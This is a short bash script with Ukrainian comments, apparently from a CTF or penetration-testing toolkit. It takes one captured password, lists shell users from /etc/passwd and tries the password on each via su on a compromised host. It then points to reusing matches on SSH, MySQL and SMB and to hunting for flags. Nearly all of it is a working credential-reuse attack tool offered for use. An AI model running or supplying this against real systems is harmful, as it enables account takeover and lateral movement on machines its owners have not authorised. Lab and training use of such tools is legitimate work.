#!/usr/bin/env bash
# cred-spray-local.sh — перевірка ОДНОГО знайденого пароля на локальних юзерах (credential reuse).
# Запуск НА ЦІЛІ (у shell), не з Kali. Це НЕ брутфорс — один пароль по юзерах з shell.
#
# Приклад запуску:
#   bash cred-spray-local.sh 'знайдений_пароль'
#
# Очікуваний результат: рядки "[+] <user> : пароль підходить" для збігів.
# Залежність: su. Інтернет не потрібен.

set -u
PASS="${1:?Приклад: bash cred-spray-local.sh '<pass>'}"

echo "[*] Перевірка пароля на локальних юзерах з інтерактивним shell..."
users=$(grep -vE 'nologin|false|sync|halt|shutdown' /etc/passwd | cut -d: -f1)

for u in $users; do
  if echo "$PASS" | timeout 5 su - "$u" -c 'id' >/dev/null 2>&1; then
    echo "[+] $u : пароль ПІДХОДИТЬ"
  fi
done

echo "[*] Готово. Для збігів -> su <user>, далі flag-hunt у домашній директорії."
echo "[*] Той самий пароль варто спробувати на SSH/MySQL/SMB (04-techniques/credentials-reuse.md)."
